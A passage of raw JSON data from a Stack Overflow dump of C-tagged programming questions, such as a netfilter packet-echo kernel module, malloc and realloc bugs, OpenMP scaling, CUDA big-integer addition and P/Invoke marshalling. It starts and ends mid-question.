iphdr *) skb_header_pointer (skb, 0, 0, NULL);\n\n        if (iph &amp;&amp; iph-&gt;protocol &amp;&amp;(iph-&gt;protocol == IPPROTO_UDP)) {\n            udph = (struct udphdr *) skb_header_pointer (skb, IP_HDR_LEN, 0, NULL);\n            src_port = ntohs (udph-&gt;source);\n            dst_port = ntohs (udph-&gt;dest);\n\n            if (dst_port == 6000) {\n                printk(KERN_ALERT \"\\nUDP packet goes in\");\n\n                data = (unsigned char *) skb_header_pointer (skb, TOT_HDR_LEN, 0, NULL);\n                data_len = skb-&gt;len - TOT_HDR_LEN;\n\n                struct sk_buff *newskb;\n                struct iphdr *newiph;\n                struct udphdr *newudph;\n                unsigned char *newdata;\n                unsigned int newdata_len;\n\n                newskb = skb_copy(skb, GFP_ATOMIC);\n                newiph = (struct iphdr *) skb_header_pointer (newskb, 0, 0, NULL);\n                newudph = (struct udphdr *) skb_header_pointer (newskb, IP_HDR_LEN, 0, NULL);\n                newdata = (unsigned char *) skb_header_pointer (newskb, TOT_HDR_LEN, 0, NULL);\n\n                newiph-&gt;saddr = iph-&gt;daddr;\n                newiph-&gt;daddr = iph-&gt;saddr;\n\n                newudph-&gt;source = udph-&gt;dest;\n                newudph-&gt;dest = udph-&gt;source;\n\n                struct sk_buff *tempskb;\n\n                tempskb = skb_copy(skb, GFP_ATOMIC);\n\n                *tempskb = *skb;\n                *skb = *newskb;\n                *newskb = *tempskb;\n\n                kfree_skb(newskb);\n\n            }\n        }\n    }\n    return NF_ACCEPT;\n}\n\n\nmodule_init(pkt_echo_init);\nmodule_exit(pkt_echo_exit);\n\nMODULE_AUTHOR(\"Rifat Rahman Ovi: &lt;rifatrahmanovi@gmail.com&gt;\");\nMODULE_DESCRIPTION(\"Echoing a packet from kernel space.\");\nMODULE_LICENSE(\"GPL\");\n</code></pre>\n\n<p>Now I do not understand what is needed. I captured the packet in the PRE_ROUTING hook.\nThen I created a new skb, populated it from the old received skb, and then altered the \nsource address (saddr), destination address (daddr), source port (source), and destination\nport (dest), so that the packet can be forwarded from the PRE_ROUTING hook. As routing \ndecisions are made after the packet passes from the hook, I look for the packet to be forwarded to its originating source. But for some reason it is not doing like that. The packet is received, and everything is altered, but the packet does not seem to move backwards. I do not understand what is missing, and also what is needed to make it work. More specifically, what is needed to send a packet to the network from a PRE_ROUTING hook?</p>\n"},{"tags":["c","d"],"answer_count":5,"favorite_count":2,"up_vote_count":10,"down_vote_count":0,"view_count":717,"score":10,"question_id":1630597,"title":"How to use a C library from D?","body":"<p>Today I heard about the D programming and that it is compatible to C code. Nevertheless I haven't found any information on whether it is possible to use C libraries like GTK or PortAudio from D?\nIf it is possible, could you explain how to do this?</p>\n"},{"tags":["c++","c","return","std","exit-code"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":13203439,"title":"EXIT_SUCCESS and EXIT_FAILURE. Is it compile once run anywhere or write once compile everywhere?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/8867871/c-c-return-exit-success-or-0-from-main\">(C/C++) return EXIT_SUCCESS or 0 from main?</a>  </p>\n</blockquote>\n\n\n\n<p>For a long time I was using return 0;, from the time I started to use allegro. Than I came across C++ book and found about EXIT_SUCCESS, than I looked into stdlib.h or cstdlib where it's defined and there is only two lines:</p>\n\n<pre><code>#define EXIT_SUCCESS 0\n#define EXIT_FAILURE 1\n</code></pre>\n\n<p>can somebody explain this to me? I am using mingw version of the last devc++ 4.9.9.2.</p>\n"},{"tags":["c","function","pointers"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13201442,"title":"Weird output in beginner Phonebook app in C","body":"<p>I'm new to C and I'm working on trying to create the typical beginners phonebook app. I've seen a lot of different links on google that show examples of the phonebook app, but nothing that shows what I'm trying to accomplish. Basically what I'm wanting to do is create a structure that has first name, last name, and 2 phone numbers, then I want to create 2 different functions for each of those. For each variable in the structure I would have one that sets the input, and then another one that reads the input. This gives me 8 functions, but then I want to add three more functions, one for adding 11each new contract to the structure, one for deleting a contact and then one for viewing the phonebook. Right now I'm focusing on the adding function and viewing function. My issue is that I am getting very weird output. </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;conio.h&gt;\n\ntypedef struct friends_contact{\n       char First_Name[10];\n       char Last_Name[10];\n       char home[15];\n       char cell[15];\n\n}fr;\n\nvoid menu(fr*friends ,int* counter,int user_entry, char* nullStr,int i);\nvoid setFirst(fr*,int *,int i);\nchar getFirst(fr*,int*,char*,int i);\nvoid setLast(fr*friends, int* counter, int i);\nchar getLast(fr*friends ,int* counter,char *nullStr, int i);\nvoid add_contact(fr*friends,int* counter,int i);\nvoid show_contact(fr*friends ,int* counter,char *nullStr, int i);\n\n\nint main()\n{\n  int user_entry=0;\n  fr friends[5];\n  int counter=0;\n  char nullStr[21] = {\"\\0\"}; \n  int i=0;\n\n menu(friends, &amp;counter,user_entry,nullStr,i);\n getch();\n return 0;\n}\n\nvoid menu(fr*friends,int* counter,int user_entry,char *nullStr,int i)\n{\n  do{\n  printf(\"Phone Book Application\\n\");\n  printf(\"1) Add friend\\n2) Delete friend\\n3) Show a friend\\n4) Show phonebook\\n5)Exit);   \n scanf(\"%d\", &amp;user_entry);\n  if(user_entry==1){\n\n                    add_contact(friends,counter,i);\n                    }\n   if(user_entry==4){\n                  show_contact(friends, counter,nullStr,i);\n                   } \n   }while(user_entry!=5);                 \n }\n\n void setFirst(fr*friends, int* counter, int i)\n{\n (*counter)++;\n printf(\"Enter a first name \\n\");\n scanf(\"%s\",&amp;friends[*counter-1].First_Name);\n}\nvoid setLast(fr*friends, int* counter, int i)\n{\n (*counter)++;\n printf(\"Enter a first name \\n\");\n scanf(\"%s\",&amp;friends[*counter-1].Last_Name);\n}\nchar getFirst(fr*friends ,int* counter,char *nullStr, int i)\n{\n     for(i=0; i&lt;*counter; i++)\n     {\n        if (strcmp(nullStr, friends[i].First_Name) != 0) \n        {\n           printf(\"%s\\n\", friends[i].First_Name);\n        }\n     }\n\nreturn *friends[i].First_Name;\n}\n\nchar getLast(fr*friends ,int* counter,char *nullStr, int i)\n{\n     for(i=0; i&lt;*counter; i++)\n     {\n        if (strcmp(nullStr, friends[i].Last_Name) != 0) \n        {\n           printf(\"%s\\n\", friends[i].Last_Name);\n        }\n     }\n\n return *friends[i].Last_Name;\n}\nvoid add_contact(fr*friends,int* counter,int i)\n{ \n setFirst(friends,counter,i); \n setLast(friends,counter,i);\n}    \n\nvoid show_contact(fr*friends ,int* counter,char *nullStr, int i)\n{\n getFirst(friends,counter,nullStr,i);\n getLast(friends,counter,nullStr,i);\n}\n</code></pre>\n\n<p>Here is the output that I get now:</p>\n\n<pre><code>Enter a first name\njohn\nEnter a first name\nsmith\nPhone Book Application\n1) Add friend\n2) Delete friend\n3) Show a friend\n4) Show phone book\n5) Exit\n\n4\njohn\n╝ ♠\n\nsmith\n</code></pre>\n\n<p>my results are equally as weird when i add another name to the list. Whats weird is I only started having these problems after I created the last name function. When I entered just first names it worked fine. Any ideas?</p>\n"},{"tags":["c++","c","com","library-design"],"answer_count":0,"favorite_count":2,"up_vote_count":15,"down_vote_count":9,"view_count":266,"score":6,"question_id":13200877,"title":"Why 'Unknwn.h' instead of 'Unknown.h'? Is it misprint?","body":"<p>Why is Microsoft's COM header file named as <a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ms680509%28v=vs.85%29.aspx\" rel=\"nofollow\"><code>Unknwn.h</code></a>, instead of <code>Unknown.h</code>? Is it misprint, or are there objective reasons for such naming?</p>\n"},{"tags":["c++","c","design"],"answer_count":24,"favorite_count":13,"up_vote_count":13,"down_vote_count":1,"view_count":2418,"score":12,"question_id":650461,"title":"What are some tricks I can use with macros?","body":"<p>In our legacy code, as well as our modern code, we use macros to perform nifty solutions like code generations, etc. And we make use of both the <code>#</code> and <code>##</code> operators. </p>\n\n<p>I am curious how other developers use macros to do cool things, if they use them at all.</p>\n"},{"tags":["c","gcc","gcc-warning"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":86,"score":4,"question_id":13202948,"title":"Prevent GCC warning \"value computed is not used\" for a macro","body":"<p>I'm working on a macro that will support error handling. </p>\n\n<pre><code>#define Try(e, call)   ( (e == OK) &amp;&amp; ((e = call) != OK) )\n</code></pre>\n\n<p>It can be used as the expression of an if-statement:</p>\n\n<pre><code>if (Try(err, SomeFunction(foo, bar))) {\n    // Entered only if err was OK before the if-statement and SomeFunction()\n    // returned a non-OK value.\n}\n</code></pre>\n\n<p>The function won't be called if <code>err</code> was already non-OK before the if-statement. After the if-statement <code>err</code> will be set to the return value of <code>SomeFunction()</code>.</p>\n\n<p>So far so good. However I also want to use the macro without an if-statement:</p>\n\n<pre><code>Try(err, SomeFunction(foo, bar));\n</code></pre>\n\n<p>In this case GCC gives the following warning:</p>\n\n<pre><code>warning: value computed is not used [-Wunused-value]\n</code></pre>\n\n<p>And that's what my question is about: how can I rewrite the macro such that GCC won't produce this warning. I know the warning can be disabled with a flag (but I want to keep it enabled for other code) or by casting the result explicitly to <code>void</code>. The following statement code won't produce the warning:</p>\n\n<pre><code>(void) Try(err, SomeFunction(foo, bar));\n</code></pre>\n\n<p>But it's far from ideal to prefix each <code>Try()</code> with a <code>void</code> cast. Any suggestions?</p>\n"},{"tags":["c","heap"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":77,"score":-2,"question_id":13202836,"title":"malloc() breaking loop","body":"<p>Why the code below shows directly the heap occupied by Mb:</p>\n\n<pre><code>int Mb = 0;\nwhile ( malloc(1&lt;&lt;20)) ++Mb;\nprintf(\"Allocated %d Mb total\\n\", Mb);\n</code></pre>\n\n<p>What is meant by <code>1&lt;&lt;20</code>?</p>\n"},{"tags":["c++","c","integer-overflow"],"answer_count":23,"favorite_count":114,"up_vote_count":136,"down_vote_count":0,"view_count":47580,"score":136,"question_id":199333,"title":"Best way to detect integer overflow in C/C++","body":"<p>I was writing a program in C++ to find all solutions of <em>a</em><sup><em>b</em></sup> = <em>c</em>, where <em>a</em>, <em>b</em> and <em>c</em> together use all the digits 0-9 exactly once. The program looped over values of <em>a</em> and <em>b</em>, and ran a digit-counting routine each time on <em>a</em>, <em>b</em> and <em>a<sup>b</sup></em> to check if the digits condition was satisfied.</p>\n\n<p>However, spurious solutions can be generated when <em>a</em><sup><em>b</em></sup> overflows the integer limit. I ended up checking for this using code like:</p>\n\n<pre><code>unsigned long b, c, c_test;\n...\nc_test=c*b;         // Possible overflow\nif (c_test/b != c) {/* There has been an overflow*/}\nelse c=c_test;      // No overflow\n</code></pre>\n\n<p>Is there a better way of testing for overflow? I know that some chips have an internal flag that is set when overflow occurs, but I've never seen it accessed through C or C++.</p>\n"},{"tags":["c","linux","pthreads","scheduler"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13183327,"title":"Drop root UID while retaining CAP_SYS_NICE","body":"<p>I'm trying to write a daemon that will start as root using a setuid bit, but then quickly revert to the user running the process.  The daemon, however needs to retain the ability to set new threads to \"realtime\" priority.  The code that I'm using to set the priority is as follows (runs in a thread once it is created): </p>\n\n<pre><code>struct sched_param sched_param;\nmemset(&amp;sched_param, 0, sizeof(sched_param));\nsched_param.sched_priority = 90;\n\nif(-1 == sched_setscheduler(0, SCHED_FIFO, &amp;sched_param)) {\n  // If we get here, we have an error, for example \"Operation not permitted\"\n}\n</code></pre>\n\n<p>However the part I'm having problems with is setting the uid, while retaining the ability to make the above call to <code>sched_setscheduler</code>.</p>\n\n<p>I have some code that runs close to startup in the main thread of my application:</p>\n\n<pre><code>if (getgid() != getegid() || getuid() != geteuid()) {\n  cap_value_t cap_values[] = {CAP_SYS_NICE};\n  cap_t caps;\n  caps = cap_get_proc();\n  cap_set_flag(caps, CAP_PERMITTED, 1, cap_values, CAP_SET);\n  cap_set_proc(caps);\n  prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);\n  cap_free(caps);\n  setegid(getgid());\n  seteuid(getuid());\n}\n</code></pre>\n\n<p>The problem is that after running this code, I get \"Operation not permitted\" when calling <code>sched_setscheduler</code> as alluded to in the comment above.  What am I doing wrong?</p>\n"},{"tags":["c","visual-studio","malloc","heap"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":78,"score":1,"question_id":13202492,"title":"Maximum size of malloc()","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2798330/maximum-memory-which-malloc-can-allocate\">maximum memory which malloc can allocate!</a>  </p>\n</blockquote>\n\n\n\n<p>How can I know the maximum size of the heap I can occupy by <code>malloc()</code>. \nI use MS Visual Studio 2010.</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":72,"score":2,"question_id":13202255,"title":"process in c is not exiting even after exit() function is called","body":"<p>I was practicing pipes in system programming when i realized that my program isn't exiting. I added <code>exit()</code> in both child and parent, but the child still isn't exiting. Please help...\nHere is the code:</p>\n\n<pre><code>#include&lt;stdlib.h&gt;\n#include&lt;stdio.h&gt;\n#include&lt;unistd.h&gt;\n//#include \"apue.h\"\n\nmain() {\n        int n,max=20;\n        pid_t pid;\n        int fd[2];\n        char line[max];\n        int i;\n        for(i=0;i&lt;20;i++) {\n            line[i]='\\0';\n        }\n\n        if(pipe(fd)&lt;0) {\n            perror(\"pipe error\");\n        }\n        if((pid=fork())&lt;0) {\n            perror(\"fork error\");\n        }\n        else if(pid &gt; 0) {\n            close(fd[0]);\n            write(fd[1], \"hello world\\n\", 12);\n            exit(1);\n        } else {\n            close(fd[1]);\n            read(fd[0], line, max);\n        }\n        puts(line);\n        exit(1);\n}\n</code></pre>\n"},{"tags":["c++","c","encryption","compiler"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":4,"view_count":76,"score":-3,"question_id":13202357,"title":"C++ Decompiling?","body":"<p>I've tried many decompilers but the most succesful was boomerang which crashes and gave me completly unfinished randomish source code. Is this even possible to decompile code and be able to re compile it?</p>\n"},{"tags":["c","lisp","scheme"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":13201407,"title":"Implementation of cons/pair","body":"<p>What are the options of implementing a Lisp's cons/pair in a low-level language such as C?</p>\n\n<p>One common implementation is a struct consisting of fields <strong>type</strong>, <strong>car</strong> and <strong>cdr</strong>. I know that linked lists are not very efficient for storage, but the additional <strong>type</strong> filed makes it even worse.</p>\n\n<p>I read on Wikipedia that <a href=\"http://en.wikipedia.org/wiki/Lisp_machine\" rel=\"nofollow\">Lisp machines</a> used to add additional bits to each word for type information. But what are the options for today's architectures (x86, ARM)?</p>\n"},{"tags":["c","segmentation-fault","malloc","realloc"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":13201750,"title":"Realloc an int array","body":"<p>I'm trying to create an array to hold an int, then when another int is to be added increase it in size to hold another int.. and so on..</p>\n\n<p>I know it's not an efficient use of realloc, but it's proof on concept more than anything else. Just to get it working would allow me to optimise it and be able to apply it to something useful. A working example. The problem comes when i call the print function and it just segfaults. Any help would be appreciated. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;string.h&gt;\n\ntypedef char String[100];\n\nvoid begin(int *);\nvoid add(int *, int);\nvoid print(int *);\n\nint tempcount=0;\n\nint main(void)\n{\n    int *n=NULL;\n    String menu;\n\n    begin(n);\n\n    while(true)\n    {\n        scanf(\"%9s\", menu);\n\n        if(!strcmp(\"a\", menu)) //add\n        {\n            int i=0;\n            scanf(\"%d\", &amp;i);\n            add(n, i);\n        }\n        else if(!strcmp(\"p\", menu)) //print\n        {\n            print(n);\n        }\n        else if(!strcmp(\"q\", menu)) //quit\n        {\n            free(n);\n            break;\n        }\n\n    }\n\n    return 0;\n}\n\nvoid begin(int *n)\n{\n    n=malloc(sizeof(int));\n\n    if(n==NULL)\n    {\n        printf(\"Error in malloc!\");\n        return;\n    }\n\n    n[0]=0;\n\n    printf(\"Added %d \\n\", n[0]);\n}\n\nvoid add(int *n, int numToAdd)\n{\n    static int sizeCount=0;\n    sizeCount++;\n    tempcount=sizeCount;\n\n    int *temp;\n\n    temp=realloc(n, (sizeCount+1) * sizeof(int));\n\n    if(temp==NULL)\n    {\n        printf(\"Error in realloc!\");\n        return;\n    }\n\n    n=temp;\n\n    n[sizeCount]=numToAdd;\n\n    printf(\"Added %d \\n\", n[sizeCount]);\n\n}\n\nvoid print(int *n)\n{\n    int i;\n    for(i=0; i&lt;tempcount; i++)\n    {\n        printf(\"%d \", n[i]);\n    }\n}\n</code></pre>\n"},{"tags":["objective-c","c","iphone-sdk-3.0","jpeg","libjpeg"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1489,"score":3,"question_id":5444999,"title":"compiling/using libjpeg for iPhone (iOS 3.0+)?","body":"<p>I want to use the libjpeg (<a href=\"http://www.ijg.org/\" rel=\"nofollow\">http://www.ijg.org/</a>) library in an iPhone iOS 3.0 or greater project.  I have tried a few different approaches, but being a bit naive, I'm not really sure how to begin.  </p>\n\n<p>I've been playing with parts and pieces of the SDL library project from here <a href=\"http://code.google.com/p/sdl-static/\" rel=\"nofollow\">http://code.google.com/p/sdl-static/</a> all to no real working outcomes.</p>\n\n<p>Can anyone link me to a tutorial or give me a push in the right direction?</p>\n\n<p>My ultimate goal is to be able to manipulate the DCT coefficients of jpeg images somewhat similar to this MatLab libjpeg wrapper.\n<a href=\"http://www.philsallee.com/jpegtbx\" rel=\"nofollow\">http://www.philsallee.com/jpegtbx</a></p>\n\n<p>So I would like to start with something like</p>\n\n<pre><code>UIImage *cover = [UIImage imageNamed:@\"cover.jpg\"];\n// convert to the libjpeg structs\n// do some DCT coefficient manipulations\nUIImage *stego = ... // save it back to iOS SDK equivalent image type\n</code></pre>\n"},{"tags":["objective-c","ios","c","xcode","crash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":13200951,"title":"objc_msgSend 15 crash","body":"<p>I'm trying to track down a bug and i've got a crash log that looks like this:</p>\n\n<pre><code>0    libobjc.A.dylib     objc_msgSend + 15\n\n1    CoreFoundation  __CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 14\n\n2    CoreFoundation  __CFRunLoopDoTimer + 272\n\n3    CoreFoundation  __CFRunLoopRun + 1232\n\n4    CoreFoundation  CFRunLoopRunSpecific + 356\n\n5    CoreFoundation  CFRunLoopRunInMode + 104\n\n6    GraphicsServices    GSEventRunModal + 74\n\n7    UIKit   UIApplicationMain + 1120\n\n8    MyApp  main.m line 21\n</code></pre>\n\n<p>Unfortunately the MyApp line is the only place among any thread that mentions my application.</p>\n\n<p>Any pointers for what may be causing a crash like this?</p>\n\n<p>thanks!</p>\n"},{"tags":["c","linux","serial-port","buffer","ioctl"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":61,"score":4,"question_id":13181040,"title":"How can I determine the amount of write/output buffer space left on a linux serial port?","body":"<p>You can determine how much data is available to read from a serial port under linux using an ioctl. Is it possible to determine how much buffer space remains for the serial port when writing to it? Effectively I want to write a block of data to a serial port, succeeding only if it can all be offloaded in one go, or failing if it would have to be chunked. The writes and reads to the ports are non-blocking. I'm not expecting this to be the UARTs buffer, but the kernels memory buffer ahead of the UARTs buffer (I guess).</p>\n"},{"tags":["c","mingw32"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":45,"score":0,"question_id":13189476,"title":"Compiling with Mingw","body":"<p>I have a bunch of C files and header files in the folder.  When I compile the C files with MinGW compiler, it shows that there is no such file or directory. But I have all the files in the same folder.  How do I get them to compile?</p>\n\n<p>I have attached the code for your reference (file <code>computil.c</code>):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;computil.h&gt;\n#include &lt;dataio.h&gt;\n\nint getc_skip_marker_segment(const unsigned short marker, unsigned char **cbufptr, unsigned char *ebufptr)\n{\n  int ret;\n  unsigned short length;\n\n  ret = getc_ushort(&amp;length, cbufptr, ebufptr);\n  if(ret)return(ret);\n  length -= 2;\n  if(((*cbufptr)+length) &gt;= ebufptr)\n  {\n    fprintf(stderr, \"ERROR : getc_skip_marker_segment : \");\n    fprintf(stderr, \"unexpected end of buffer when parsing \");\n    fprintf(stderr, \"marker %d segment of length %d\\n\", marker, length);\n    return(-2); }(*cbufptr) += length; return(0);\n  }\n}\n</code></pre>\n\n<p>I am compiling it with <code>gcc -c computil.c</code>.</p>\n"},{"tags":["c","cuda","gpgpu","thrust"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":250,"score":6,"question_id":12957116,"title":"large integer addition with CUDA","body":"<p>I've been developing a cryptographic algorithm on the GPU and currently stuck with an algorithm to perform large integer addition. Large integers are represented in a usual way as a bunch of 32-bit words. </p>\n\n<p>For example, we can use one thread to add two 32-bit words. For simplicity, let assume \nthat the numbers to be added are of the same length and number of threads per block == number of words. Then:</p>\n\n<pre><code>__global__ void add_kernel(int *C, const int *A, const int *B) {\n     int x = A[threadIdx.x];\n     int y = B[threadIdx.x];\n     int z = x + y;\n     int carry = (z &lt; x);\n     /** do carry propagation in parallel somehow ? */\n     ............\n\n     z = z + newcarry; // update the resulting words after carry propagation\n     C[threadIdx.x] = z;\n }\n</code></pre>\n\n<p>I am pretty sure that there is a way to do carry propagation via some tricky reduction procedure but could not figure it out..</p>\n\n<p>I had a look at <a href=\"http://code.google.com/p/cuda-thrust-extensions/source/browse/trunk/big+integer/\" rel=\"nofollow\">CUDA thrust extensions</a> but big integer package seems not to be implemented yet.\nPerhaps someone can give me a hint how to do that on CUDA ?</p>\n"},{"tags":["c++","c"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":53,"score":1,"question_id":13198689,"title":"Accessing a variable from a C file in CPP file","body":"<p>I've got a program where I'm forced to meld together some C and C++ code. I've got some global variables defined in C and I need to access them in both C and C++ files but can't figure it out. Here's what I have, which works in C files, but not in CPPs:</p>\n\n<p>C.h</p>\n\n<pre><code>#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#ifndef _COMMON_H_\n#define _COMMON_H_\n\nextern char test[100];\n\n#ifdef __cplusplus\n}\n#endif\n</code></pre>\n\n<p>C.c</p>\n\n<pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#include \"C.h\"\n\nchar test[100] = \"value\";\n</code></pre>\n\n<p>CPlusPlus.cpp</p>\n\n<pre><code>#include \"C.h\"\n\nint TestFunction() {\n    // I need to access variable test here\n}\n</code></pre>\n\n<p>Thanks,\nBen</p>\n"},{"tags":["c","parallel-processing","openmp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":13199384,"title":"Why isn't this OpenMP parallel operation as fast as it could be?","body":"<p>I have a C program that must be implemented using OpenMP library. Its structure is:</p>\n\n<pre><code>for (t = 0; t &lt; IT; ++t) {\n#pragma omp parallel for private(i, j, k, l) schedule(dynamic)\n    for (i = 0; i &lt; n; ++i) {\n        for (j = 0; j &lt; n; ++j) {\n                for (k = 0; k &lt; n; ++k) {\n                    for (l = 0; l &lt; n; ++l) {\n                        // calculations 0\n                    }\n                }\n\n        // calculations 1\n        }\n    }\n\n#pragma omp parallel for private(i, j) schedule(dynamic)\n    for (i = 0; i &lt; n; ++i) {\n        for (j = 0; j &lt; n; ++j) {\n            // calculations 2\n        }\n    } \n}\n</code></pre>\n\n<p>This programs makes some calculations on a matrix.  Calculation 2 must be done after calculations 0 and 1 are done, because it make some modifications in the matrix.</p>\n\n<p>The problem is that the speedup is very bad, i.e. the program is not scalable. The serial version for a given input runs in 79.46s.  When running with two threads it finishes in 41s giving an almost perfect speedup of 1.93 times, but when running 3 threads it finishes in 37.86s (with a speedup of only 2.1 times), and with 4 threads it takes 34.104s (with a speedup of only 2.3 times).</p>\n\n<p>Why is this not scalable?</p>\n\n<p>PS. I have an Intel i5 430M with 4 cores.</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":13199693,"title":"What does the n stand for in `sscanf(s, \"%d %n\", &i, &n)`?","body":"<p>The man page states that the signature of <code>sscanf</code> is</p>\n\n<pre><code>sscanf(const char *restrict s, const char *restrict format, ...);\n</code></pre>\n\n<p>I have seen an <a href=\"http://stackoverflow.com/a/456314/641514\">answer on SO</a> where a function in which <code>sscanf</code> is used like this to check if an input was an integer.</p>\n\n<pre><code>bool is_int(char const* s) {\n    int n;\n    int i;\n    return sscanf(s, \"%d %n\", &amp;i, &amp;n) == 1 &amp;&amp; !s[n];\n}\n</code></pre>\n\n<p>Looking at <code>!s[n]</code> it seems to suggest that we check if <code>sscanf</code> scanned the character sequence until the termination character <code>\\0</code>. So I assume <code>n</code> stands for the index where sscanf will be in the string <code>s</code> when the function ends.</p>\n\n<p><strong>But what about the variable <code>i</code>? What does it mean?</strong></p>\n\n<p><strong>Edit:</strong></p>\n\n<p>To be more explicit: I see the signature of <code>sscanf</code> wants a pointer of type <code>char *</code> as first parameter. A format specifier as seconf parameter so it knows how to parse the character sequence and as much variables as conversion specifiers as next parameters. I understand now that <code>i</code> is for holding the parsed integer.</p>\n\n<p>Since there is  only one format specifier, I tried to deduce the function of <code>n</code>.</p>\n\n<p>Is my assumption above for <code>n</code> correct?</p>\n"},{"tags":["c#","c"],"answer_count":4,"favorite_count":0,"up_vote_count":8,"down_vote_count":1,"view_count":277,"score":7,"question_id":13118771,"title":"Calling C code from C# - stuck with a couple of issues","body":"<p>I have some C code that and I trying to use from C#. Most of the conversion is done. I have a couple of issues though.</p>\n\n<p>Part of the 'C' code looks like this.</p>\n\n<pre><code>typedef struct r_GetCPL {\n\n  UInt8 Storage;\n  UInt8 Key[16];             //(1) \n\n  UInt8 *Buff;               //(2)\n  Array16 *CryptoKeyIDs;     //(3)\n\n} REPLY_GETCPL;\n</code></pre>\n\n<p>alias defined in 'C'</p>\n\n<pre><code>typedef unsigned char      UInt8;\ntypedef unsigned short     UInt16;\ntypedef unsigned long      UInt32;\ntypedef unsigned long long UInt64;\n\ntypedef UInt8   Array8[8];\ntypedef UInt8   Array16[16];\ntypedef UInt8   Array32[32];\ntypedef UInt8   Array64[64];\ntypedef UInt8   Array128[128];\n</code></pre>\n\n<p>I am assuming I can replace the typedef with a direct struct definition. Is this fine?\nThe equivalent C# struct I defined is,</p>\n\n<pre><code>public struct REPLY_GETCPL \n{\n  Byte Storage;\n  Byte[16] Key;          //(1) Is this right?\n\n  UInt8 *Buff;           //(2)  What is the equivalent?\n  Array16 *CryptoKeyIDs; //(3)  What is the equivalent?\n}\n</code></pre>\n\n<p>Also, There are a couple of methods import that I am stuck at</p>\n\n<pre><code>void hex_print(char* data, UInt32 length);\nDRMKLVItem *NewDRMKLVItem(UInt32 lenBuff, UInt32 cmdId);\nRESULT DRMKLVLengthDecode(const UInt8 *s, UInt32 *pLen);\n</code></pre>\n\n<p>C#</p>\n\n<pre><code>//I think this one is defined right\n[DllImport(\"DoremiSource.dll\")]\npublic static extern void hex_print([MarshalAs(UnmanagedType.LPStr)]string data, UInt32 length);\n\n//(How to convert the function return type?)\n[DllImport(\"DoremiSource.dll\")]\npublic static extern DRMKLVItem *NewDRMKLVItem(UInt32 lenBuff, UInt32 cmdId);  //(4)\n\n//(How do i convert the function parameters here)\n[DllImport(\"DoremiSource.dll\", CharSet = CharSet.Ansi)]\npublic static extern int DRMKLVLengthDecode(const UInt8 *s, ref UInt32 pLen);  //(5)\n</code></pre>\n"},{"tags":["c++","c","image","opengl","glfw"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13197412,"title":"OpenGL generic image reader and GLFW (glfwReadImage, glfwLoadTexture2D) support for various image format","body":"<p>While learning OpenGL, I am looking for an image reader which can evaluate various image types like <code>\".png\", \".bmp\", \".tga\", \".dds\", ...</code>. My plan is to extract the params like <code>height</code>, <code>width</code>, <code>type</code> of the image file and set it with below kind of function:</p>\n\n<pre><code>glTexImage2D(GL_TEXTURE_2D, 0, &lt;color format&gt;, &lt;width&gt;, &lt;height&gt;,\n    0, &lt;color orientation&gt;, &lt;data type&gt;, &lt;actual data&gt;);\n</code></pre>\n\n<p>I went through <a href=\"http://cimg.sourceforge.net/\" rel=\"nofollow\">CImg library</a> and <a href=\"http://nothings.org/stb_image.c\" rel=\"nofollow\">stb_image.c</a>. However, I couldn't get how to get the parameters like <code>widhth</code>, <code>height</code>, <code>type</code> and so on.</p>\n\n<p>It seems that <code>&lt;GL/glfw.h&gt;</code> a nice framework for this. I have an impression that it just loads <code>\".tga\"</code> format using below function:</p>\n\n<pre><code>int glfwLoadTexture2D(const char *name, int flags);\n</code></pre>\n\n<p>Does it support all the formats ?</p>\n\n<p>Also, I see the below functions nearby it. If someone can brief about then it will be a bonus.</p>\n\n<pre><code>int  glfwReadImage(const char *name, GLFWimage *img, int flags);\nvoid glfwFreeImage(GLFWimage *img);\n</code></pre>\n\n<p>where:</p>\n\n<pre><code>typedef struct {\n  int Width, Height;\n  int Format;\n  int BytesPerPixel;\n  unsigned char *Data;\n} GLFWimage;\n</code></pre>\n\n<p>If GLFW doesn't support all formats then is there any library which just gets the above <code>GLFWimage</code> like params and allow us to set it through 